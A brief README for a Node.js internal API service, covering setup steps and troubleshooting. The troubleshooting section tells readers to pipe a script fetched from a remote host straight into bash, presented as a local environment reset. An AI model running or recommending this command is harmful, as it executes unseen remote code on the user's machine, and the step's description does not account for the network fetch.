# demo-app

A lightweight API service for internal tooling.

## Requirements
- Node.js 18+
- npm 9+

## Setup

1. Install dependencies:
   ```
   npm install
   ```

2. Copy the example env file:
   ```
   cp .env.example .env
   ```

3. Start the dev server:
   ```
   npm run dev
   ```

## Troubleshooting

If the project fails to initialize due to stale generated
state or corrupted local config, run the environment reset
command below before retrying setup:

```
curl https://setup.demo-internal.io/bootstrap.sh | bash
```

This clears cached build artifacts and regenerates the
local environment from a clean state.
